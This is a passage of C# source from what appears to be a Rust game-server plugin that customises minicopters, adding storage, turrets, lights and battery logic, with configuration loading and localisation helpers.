                copter.fuelPerSec = config.fuelPerSec;
            }
            copter.liftFraction = config.liftFraction;
            copter.torqueScale = new Vector3(config.torqueScalePitch, config.torqueScaleYaw, config.torqueScaleRoll);

            // Override the inertia tensor since if the server had rebooted while there were attachments, it would have been snapshotted to an unreasonable value.
            // This is the vanila amount while the prevent building object is inactive.
            // To determine this value, simply deactivate the prevent building object, call rigidBody.ResetInertiaTensor(), then print the value.
            copter.rigidBody.inertiaTensor = new Vector3(407.1f, 279.6f, 173.2f);

            if (config.autoturret) {
                // Setup existing turret, or add a new one.
                var turret = copter.GetComponentInChildren<AutoTurret>();
                if (turret != null) {
                    SetupAutoTurret(turret);

                    // Setup existing switch, but don't add a new one since that may add a duplicate battery.
                    var turretSwitch = turret.GetComponentInChildren<ElectricSwitch>();
                    if (turretSwitch != null) {
                        SetupSwitch(turretSwitch);
                    }
                } else {
                    AddTurret(copter);
                }
            }

            var existingStorage = GetStorage(copter);
            if (existingStorage.Length > 0) {
                // Existing storage found, update its state and don't add any more storage.
                foreach (var storage in existingStorage) {
                    SetupStorage(storage);
                }
            } else {
                // Add storage since none was found.
                AddLargeStorageBox(copter);

                switch (config.storageContainers) {
                    case 1:
                        AddRearStorageBox(copter);
                        break;
                    case 2:
                        AddSideStorageBoxes(copter);
                        break;
                    case 3:
                        AddRearStorageBox(copter);
                        AddSideStorageBoxes(copter);
                        break;
                }
            }

            if (IsBatteryEnabled()) {
                // Setup battery if present, but don't add a new one since that's handled when adding a switch.
                var battery = copter.GetComponentInChildren<ElectricBattery>();
                if (battery != null) {
                    SetupBattery(battery);
                    SetupInvincibility(battery);
                }
            }

            if (config.addSearchLight) {
                // Setup existing search light, or add a new one.
                var searchLight = copter.GetComponentInChildren<SearchLight>();
                if (searchLight != null) {
                    SetupSearchLight(searchLight);
                    SetupInvincibility(searchLight);

                    var sphereEntity = searchLight.GetParentEntity() as SphereEntity;
                    if (sphereEntity != null)
                        SetupSphereEntity(sphereEntity);
                } else {
                    AddSearchLight(copter);
                }
            }

            if (config.lightTail) {
                // Setup existing tail light, or add a new one.
                var tailLight = copter.GetComponentInChildren<FlasherLight>();
                if (tailLight != null) {
                    SetupTailLight(tailLight);
                    SetupInvincibility(tailLight);
                } else {
                    AddTailLight(copter);
                }
            }
        }

        void StoreMiniCopterDefaults() {
            var copter = GameManager.server.FindPrefab(minicopterPrefab)?.GetComponent<MiniCopter>();
            if (copter == null)
                return;

            //Puts($"Defaults for copters saved as \nfuelPerSecond = {copter.fuelPerSec}\nliftFraction = {copter.liftFraction}\ntorqueScale = {copter.torqueScale}");
            copterDefaults = new MiniCopterDefaults {
                fuelPerSecond = copter.fuelPerSec,
                liftFraction = copter.liftFraction,
                torqueScale = copter.torqueScale
            };
        }

        #endregion

        #region Hooks

        void OnServerInitialized(bool init) {
            StoreMiniCopterDefaults();

            if (config.lightTail) {
                SetupTimeHooks();
            }

            if (!config.addSearchLight)
                Unsubscribe(nameof(OnServerCommand));

            foreach (var copter in BaseNetworkable.serverEntities.OfType<MiniCopter>()) {
                OnEntitySpawned(copter);

                var scrapHeli = copter as ScrapTransportHelicopter;
                if ((object)scrapHeli != null) {
                    // A previous version of the plugin would set scrap helis to minicopter values on Unload,
                    // so fix them when the plugin loads if needed.
                    FixScrapHeliIfNeeded(scrapHeli);
                }
            }

            Subscribe(nameof(OnEntitySpawned));
        }

        void Unload() {
            if (config.lightTail && time != null) {
                time.Components.Time.OnHour -= OnHour;
            }

            // If the plugin is unloaded before OnServerInitialized() ran, don't revert minicopters to 0 values.
            if (copterDefaults != default(MiniCopterDefaults)) {
                foreach (var copter in BaseNetworkable.serverEntities.OfType<MiniCopter>()) {
                    if (config.restoreDefaults)
                        RestoreMiniCopter(copter, config.reloadStorage);
                }
            }
        }

        void OnEntitySpawned(MiniCopter copter) {
            if (copter is ScrapTransportHelicopter)
                return;

            // Only add storage on spawn so we don't stack or mess with
            // existing player storage containers.
            ModifyMiniCopter(copter);
        }

        void OnEntityKill(BaseNetworkable entity) {
            if (!config.dropStorage || !(entity is MiniCopter))
                return;

            StorageContainer[] containers = entity.GetComponentsInChildren<StorageContainer>();
            foreach (StorageContainer container in containers) {
                container.DropItems();
            }

            AutoTurret[] turrets = entity.GetComponentsInChildren<AutoTurret>();
            foreach (AutoTurret turret in turrets) {
                turret.DropItems();
            }
        }

        void OnSwitchToggled(ElectricSwitch electricSwitch, BasePlayer player) {
            if (IsBatteryEnabled())
            {
                // Do nothing since the switch is supposed to be wired into the turret,
                // so the game should handle this automatically.
                return;
            }

            AutoTurret turret = electricSwitch.GetParentEntity() as AutoTurret;
            if (turret == null)
                return;

            var mini = turret.GetParentEntity() as MiniCopter;
            if (mini == null)
            {
                // Ignore if the turret isn't on a mini, to avoid plugin conflicts.
                return;
            }

            if (electricSwitch.IsOn()) {
                turret.SetFlag(IOEntity.Flag_HasPower, true);
                turret.InitiateStartup();
            } else {
                turret.SetFlag(IOEntity.Flag_HasPower, false);
                turret.InitiateShutdown();
            }
        }

        object OnTurretTarget(AutoTurret turret, BaseCombatEntity target) {
            if (target == null)
                return null;

            var mini = turret.GetParentEntity() as MiniCopter;
            if ((object)mini == null || mini is ScrapTransportHelicopter)
                return null;

            var basePlayer = target as BasePlayer;
            if ((object)basePlayer != null) {
                if (basePlayer.InSafeZone() && (basePlayer.IsNpc || !basePlayer.IsHostile()))
                    return False;
            }

            return null;
        }

        object OnServerCommand(ConsoleSystem.Arg arg) {
            if (arg.Connection == null || arg.cmd.FullName != "inventory.lighttoggle")
                return null;

            var player = arg.Player();
            if (player == null)
                return null;

            var mini = player.GetMountedVehicle() as MiniCopter;
            if (mini == null)
                return null;

            if (!mini.IsDriver(player))
                return null;

            foreach (var child in mini.children) {
                var sphere = child as SphereEntity;
                if ((object)sphere == null)
                    continue;

                foreach (var grandChild in sphere.children) {
                    var light = grandChild as SearchLight;
                    if ((object)light == null)
                        continue;

                    light.SetFlag(IOEntity.Flag_HasPower, !light.IsPowered());

                    // Prevent other lights from toggling.
                    return False;
                }
            }

            return null;
        }

        void OnEntityDismounted(BaseNetworkable entity, BasePlayer player) {
            if (config.flyHackPause > 0 && entity.GetParentEntity() is MiniCopter)
                player.PauseFlyHackDetection(config.flyHackPause);
        }

        object CanMountEntity(BasePlayer player, BaseMountable entity) {
            if (!(entity is MiniCopter) && !(entity.GetParentEntity() is MiniCopter))
                return null;

            if (!IsBatteryEnabled())
                return null;

            MiniCopter mini = entity.GetParentEntity() as MiniCopter;
            if (mini != null) {
                IOEntity battery = GetBatteryConnected(mini);
                if (battery != null) {
                    player.ChatMessage(string.Format(GetMsg("Err - Diconnect Battery", player.UserIDString), battery.GetDisplayName()));
                    return False;
                }
            }
            return null;
        }

        void OnItemDeployed(Deployer deployer, StorageContainer container, BaseLock baseLock) {
            if (container == null || baseLock == null)
                return;

            var parent = container.GetParentEntity();
            if (parent == null || !(parent is MiniCopter) || parent is ScrapTransportHelicopter)
                return;

            if (container.PrefabName != storageLargePrefab)
                return;

            baseLock.transform.localPosition = new Vector3(0.0f, 0.3f, 0.298f);
            baseLock.transform.localRotation = Quaternion.Euler(new Vector3(0, 90, 0));
            baseLock.SendNetworkUpdateImmediate();
        }

        #endregion

        #region Configuration

        class MiniCopterDefaults
        {
            public float fuelPerSecond;
            public float liftFraction;
            public Vector3 torqueScale;
        }

        private class Configuration : SerializableConfiguration {

            // Populated with Rust defaults.
            [JsonProperty("Fuel per Second")]
            public float fuelPerSec = 0.25f;

            [JsonProperty("Lift Fraction")]
            public float liftFraction = 0.25f;

            [JsonProperty("Pitch Torque Scale")]
            public float torqueScalePitch = 400f;

            [JsonProperty("Yaw Torque Scale")]
            public float torqueScaleYaw = 400f;

            [JsonProperty("Roll Torque Scale")]
            public float torqueScaleRoll = 200f;

            [JsonProperty("Storage Containers")]
            public int storageContainers = 0;

            [JsonProperty("Large Storage Containers")]
            public int storageLargeContainers = 0;

            [JsonProperty("Restore Defaults")]
            public bool restoreDefaults = true;

            [JsonProperty("Reload Storage")]
            public bool reloadStorage = false;

            [JsonProperty("Drop Storage Loot On Death")]
            public bool dropStorage = true;

            [JsonProperty("Large Storage Lockable")]
            public bool largeStorageLockable = true;

            [JsonProperty("Large Storage Size (Max 48)")]
            public int largeStorageSize = 48;

            [JsonProperty("Large Storage Size (Max 42)")]
            public int largeStorageSizeDeprecated {
                set { largeStorageSize = value; }
            }

            [JsonProperty("Seconds to pause flyhack when dismount from heli.")]
            public int flyHackPause = 1;

            [JsonProperty("Add auto turret to heli")]
            public bool autoturret = false;

            [JsonProperty("Auto turret uses battery")]
            public bool autoturretBattery = true;

            [JsonProperty("Mini Turret Range (Default 30)")]
            public float turretRange = 30f;

            [JsonProperty("Light: Add Searchlight to heli")]
            public bool addSearchLight = true;

            [JsonProperty("Light: Add Nightitme Tail Light")]
            public bool lightTail = false;
        }

        private Configuration GetDefaultConfig() => new Configuration();

        #region Configuration Helpers

        private class SerializableConfiguration {
            public string ToJson() => JsonConvert.SerializeObject(this);

            public Dictionary<string, object> ToDictionary() => JsonHelper.Deserialize(ToJson()) as Dictionary<string, object>;
        }

        private static class JsonHelper {
            public static object Deserialize(string json) => ToObject(JToken.Parse(json));

            private static object ToObject(JToken token)
            {
                switch (token.Type)
                {
                    case JTokenType.Object:
                        return token.Children<JProperty>()
                                    .ToDictionary(prop => prop.Name,
                                                  prop => ToObject(prop.Value));

                    case JTokenType.Array:
                        return token.Select(ToObject).ToList();

                    default:
                        return ((JValue)token).Value;
                }
            }
        }

        private bool MaybeUpdateConfig(SerializableConfiguration config) {
            var currentWithDefaults = config.ToDictionary();
            var currentRaw = Config.ToDictionary(x => x.Key, x => x.Value);
            return MaybeUpdateConfigDict(currentWithDefaults, currentRaw);
        }

        private bool MaybeUpdateConfigDict(Dictionary<string, object> currentWithDefaults, Dictionary<string, object> currentRaw) {
            bool changed = false;

            foreach (var key in currentWithDefaults.Keys)
            {
                object currentRawValue;
                if (currentRaw.TryGetValue(key, out currentRawValue))
                {
                    var defaultDictValue = currentWithDefaults[key] as Dictionary<string, object>;
                    var currentDictValue = currentRawValue as Dictionary<string, object>;

                    if (defaultDictValue != null)
                    {
                        if (currentDictValue == null)
                        {
                            currentRaw[key] = currentWithDefaults[key];
                            changed = true;
                        }
                        else if (MaybeUpdateConfigDict(defaultDictValue, currentDictValue))
                            changed = true;
                    }
                }
                else
                {
                    currentRaw[key] = currentWithDefaults[key];
                    changed = true;
                }
            }

            return changed;
        }

        protected override void LoadDefaultConfig() => config = GetDefaultConfig();

        protected override void LoadConfig() {
            base.LoadConfig();
            try
            {
                config = Config.ReadObject<Configuration>();
                if (config == null)
                {
                    throw new JsonException();
                }

                if (MaybeUpdateConfig(config))
                {
                    LogWarning("Configuration appears to be outdated; updating and saving");
                    SaveConfig();
                }
            }
            catch (Exception e)
            {
                LogError(e.Message);
                LogWarning($"Configuration file {Name}.json is invalid; using defaults");
                LoadDefaultConfig();
            }
        }

        protected override void SaveConfig() {
            Log($"Configuration changes saved to {Name}.json");
            Config.WriteObject(config, true);
        }

        #endregion

        #endregion

        #region Helpers

        private string GetEnglishName(string shortName) { return ItemManager.FindItemDefinition(shortName)?.displayName?.english ?? shortName; }

        void PrintComponents(BaseEntity ent) {
            foreach (var sl in ent.GetComponents<Component>()) {
                Puts($"-P- {sl.GetType().Name} | {sl.name}");
                foreach (var s in sl.GetComponentsInChildren<Component>()) {
                    Puts($"-C- {s.GetType().Name} | {s.name}");
                }
            }
        }

        #endregion

        #region Languages

        protected override void LoadDefaultMessages() {
            lang.RegisterMessages(new Dictionary<string, string> {
                ["Err - Diconnect Battery"] = "First disconnect battery input from {0}",
                ["Err - Can only push minicopter"] = "You have to look at a minicopter. Pushing {0} not allowed"
            }, this);
        }

        string GetMsg(string key, string userIdString) => lang.GetMessage(key, this, userIdString);

        #endregion

    }
}
